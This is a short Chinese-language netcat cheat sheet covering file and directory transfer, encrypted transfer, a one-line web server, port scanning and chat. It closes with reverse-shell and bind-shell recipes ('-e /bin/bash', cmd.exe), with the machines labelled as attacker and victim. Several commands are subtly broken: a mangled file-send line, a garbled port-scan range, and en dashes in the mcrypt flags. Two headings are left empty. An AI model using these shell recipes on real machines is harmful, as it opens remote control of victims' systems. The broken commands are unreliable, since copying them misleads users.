# netcat

### 什么是 netcat？

网络工具中的瑞士军刀

### 不同版本差异

Linux 下 netcat 存在两个版本

* netcat-openbsd（默认）
* netcat-traditional

前者为 ubuntu 软件源默认选项，但功能较弱。建议安装 netcat-traditional。 netcat-traditional 支持 `-e` 参数。

### 基础使用

连接指定 IP 指定端口

```bash
nc 192.168.1.1 22
```

### 目录传输

发送方

```bash
tar -cvf – dir_name | nc -l 1567
```

接收方

```bash
nc -n 172.31.100.7 1567 | tar -xvf -
```

### 克隆设备

### DoS

### 加密

对称加密

```bash
nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt
```

```bash
mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567
```

### 接收 / 传输文件

发送方\(192.168.1.1\)

```bash
nc 192.168.1.2 8888 C tokyohot . avi
```

接收方\(192.168.1.2\)

```bash
nc -nlvp 8888 > english.avi
```

反之亦然

### 简易 WEB 服务器

```bash
while true; do
echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -lnvp 80
done
```

### 端口扫描

```bash
nc -znv 192. 168.1.11-1824
-z Specifies that nc should just scan
```

### 聊天服务器

用户 A（192.168.1.1）

```bash
nc -lnvp 4444
```

用户 B

```bash
nc 192.168.1.1 4444
```

### 反向 Shell

攻击者（192.168.1.1）

```bash
nc -lnvp 4444
```

受害者（192.168.1.2）

```bash
nc 192.168.1.1 4444 -e cmd.exe
nc 192.168.1.1 4444 -e /bin/bash
```

### 正向 Shell

受害者（192.168.1.2）

```bash
nc -lnvp 4444 cmd.exe
nc -lnvp 4444 /bin/bash
```

攻击者（192.168.1.1）

```bash
nc 192.168.1.2 4444
```

